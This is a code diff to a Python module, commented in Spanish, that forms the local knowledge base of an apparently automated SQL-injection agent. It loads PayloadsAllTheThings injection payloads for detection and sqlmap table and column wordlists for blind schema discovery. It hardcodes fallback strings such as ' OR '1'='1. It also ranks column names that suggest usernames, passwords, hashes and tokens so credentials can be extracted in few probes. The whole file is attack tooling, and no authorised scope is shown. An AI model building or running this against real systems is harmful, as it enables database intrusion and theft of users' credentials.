@@ -1,9 +1,14 @@
 """Base de conocimiento del agente (RAG local, sin nube).
 
-El agente se ALIMENTA de datasets curados —plantillas de técnicas de extracción y una escalera de
-evasión de WAF (de PayloadsAllTheThings / SecLists)— y a la vez GENERA sus payloads rellenando esas
-plantillas con el esquema que descubre. Todo es con respaldo determinista: si un dataset falta o
-está corrupto, se usan los valores por defecto para que el agente siga siendo robusto.
+El agente se ALIMENTA de datasets y a la vez GENERA sus payloads rellenando plantillas con el
+esquema que descubre. Fuentes reales (todas públicas y citables):
+  * `datasets/corpus/`  — 781 payloads de PayloadsAllTheThings (se DISPARAN en la detección).
+  * `datasets/wordlists/` — common-columns / common-tables de sqlmap (nombres para el descubrimiento
+    ciego cuando information_schema está bloqueado).
+  * `datasets/sqli_kb.json` — plantillas de técnicas de extracción (sintaxis MySQL estándar) y la
+    escalera de evasión de WAF.
+Todo con respaldo determinista: si un dataset falta o está corrupto, se usan valores por defecto
+para que el agente siga siendo robusto.
 
 Esto es el diferenciador frente a RADAGAS (que hace RAG en la nube): aquí el conocimiento vive en
 archivos locales y se combina con el descubrimiento."""
@@ -105,4 +110,71 @@ def corpus_size() -> int:
 
 def detection_payloads(limit: int = 6) -> list[str]:
     """Payloads reales de detección de inyección (fuzz/polyglots) del corpus."""
-    return corpus().get("detection", [])[:limit]
+    det = corpus().get("detection", [])
+    # Respaldo: si el corpus no trae categoría 'detection', usa payloads de detección clásicos.
+    return (det or ["'", "''", "`", "1'1", "'\"", "' OR '1'='1", "1 AND 1=1", "1 AND 1=2"])[:limit]
+
+
+def corpus_payloads(technique: str, limit: int = 20) -> list[str]:
+    """Payloads reales del corpus para una técnica dada (union, error-based, boolean-blind...)."""
+    return corpus().get(technique, [])[:limit]
+
+
+# --- Wordlists de nombres comunes (sqlmap) para descubrimiento sin information_schema -----------
+
+_WORDLISTS = _DATASETS / "wordlists"
+_USER_HINTS = ("user", "login", "uname", "name", "email", "mail", "account", "member", "nick")
+_PASS_HINTS = ("pass", "pwd", "secret", "hash", "token", "credential", "salt", "auth")
+
+
+def _load_wordlist(name: str) -> list[str]:
+    """Lee una wordlist de sqlmap (ignora líneas de comentario `#` y vacías; dedup sin distinguir
+    mayúsculas, conservando el orden del archivo)."""
+    path = _WORDLISTS / name
+    try:
+        raw = path.read_text(encoding="utf-8", errors="ignore").splitlines()
+    except Exception:
+        return []
+    out, seen = [], set()
+    for ln in raw:
+        w = ln.strip()
+        if not w or w.startswith("#"):
+            continue
+        key = w.lower()
+        if key not in seen:
+            seen.add(key)
+            out.append(w)
+    return out
+
+
+def common_columns() -> list[str]:
+    """Nombres de columnas comunes (sqlmap common-columns.txt)."""
+    return _load_wordlist("common-columns.txt")
+
+
+def common_tables() -> list[str]:
+    """Nombres de tablas comunes (sqlmap common-tables.txt)."""
+    return _load_wordlist("common-tables.txt")
+
+
+def _prioritize(columns: list[str], hints: tuple[str, ...], cap: int) -> list[str]:
+    """Ordena candidatos: coincidencia EXACTA con un hint primero, luego los que lo contienen
+    (sin ser un 'id'), hasta `cap`. Así el caso común (user/password) se resuelve en pocos sondeos."""
+    exact, partial, seen = [], [], set()
+    for c in columns:
+        cl = c.lower()
+        bucket = exact if cl in hints else (partial if any(h in cl for h in hints) and "id" not in cl else None)
+        if bucket is not None and cl not in seen:
+            seen.add(cl)
+            bucket.append(c)
+    return (exact + partial)[:cap]
+
+
+def credential_column_candidates(cap: int = 120) -> tuple[list[str], list[str]]:
+    """(candidatos_usuario, candidatos_password) sacados de la wordlist de sqlmap, priorizados por
+    nombres con pinta de credencial. Respaldo: lista mínima si la wordlist no está disponible."""
+    cols = common_columns()
+    if not cols:
+        return (["user", "username", "login", "name", "email"],
+                ["password", "pass", "pwd", "passwd", "secret", "hash"])
+    return _prioritize(cols, _USER_HINTS, cap), _prioritize(cols, _PASS_HINTS, cap)
